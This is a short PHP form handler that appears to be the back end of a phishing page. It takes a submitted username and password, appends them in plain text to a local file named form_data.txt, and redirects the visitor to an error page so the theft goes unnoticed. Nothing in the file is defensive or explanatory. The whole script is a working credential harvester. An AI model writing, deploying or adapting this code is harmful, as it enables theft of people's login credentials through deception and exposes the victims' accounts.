<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uname = $_POST["uname"];
    $password = $_POST["password"];
    
    $data = "Username: $uname\tPassword: $password\n\n";

    
    $filePath = "form_data.txt";

    
    $file = fopen($filePath, "a");

    
    fwrite($file, $data);

    
    fclose($file);

    
    header("Location: error.html");
    exit();
}
?>

